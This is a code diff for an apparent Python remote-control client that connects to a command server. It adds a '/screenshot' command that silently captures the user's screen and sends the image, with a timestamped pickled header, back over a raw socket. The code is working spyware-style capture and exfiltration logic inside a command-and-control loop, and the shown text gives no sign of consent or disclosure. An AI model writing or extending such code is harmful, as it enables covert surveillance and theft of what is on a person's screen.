@@ -6,8 +6,10 @@ __version__ = '2.0'
 
 from socket import socket, AF_INET, SOCK_STREAM
 from getpass import getuser
+from datetime import datetime
+from pyscreenshot import grab
 from pickle import dumps
-from requests import get
+from requests import get, packages
 from os import uname
 from time import sleep
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
@@ -17,15 +19,31 @@ packages.urllib3.disable_warnings(InsecureRequestWarning)
 class Client(object):
     def __init__(self, host='0.0.0.0', port=1234):
         self.__Address = (host, port)
-        
+        self.screenshotPath = '/home/znairy/736f6e61726973.png'
+
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
 
+    def screenshot(self, args):
+        grab().save(self.screenshotPath)
+        log = datetime.now()
+        
+        with open(self.screenshotPath, 'rb') as file:
+            file = file.read()
+
+        header = {
+            "namefile": f"{log.day}-{log.month}-{log.year}.{log.hour}-{log.minute}-{log.second}",
+            "extension": "png",
+            "bytes": len(file) 
+        }
+
+        self.__Client.send(dumps(header))
+        sleep(1)
+        self.__Client.send(file)
+
     def allCommands(self):
         commands = {
-            "/clear": {},
-            "/sessions": {},
-            "/rmsession": {}
+            "/screenshot": {"action": self.screenshot}
         }
 
         return commands
@@ -35,7 +53,6 @@ class Client(object):
 
     def runCommand(self, command):
         command, args = self.splitCommand(command.split())
-
         command['action'](args)
 
     def listenServer(self):
@@ -73,7 +90,7 @@ class Client(object):
 
 
 def main():
-    client = Client()
+    client = Client('127.0.0.1', 5000)
     client.run()
 
 if __name__ == '__main__':
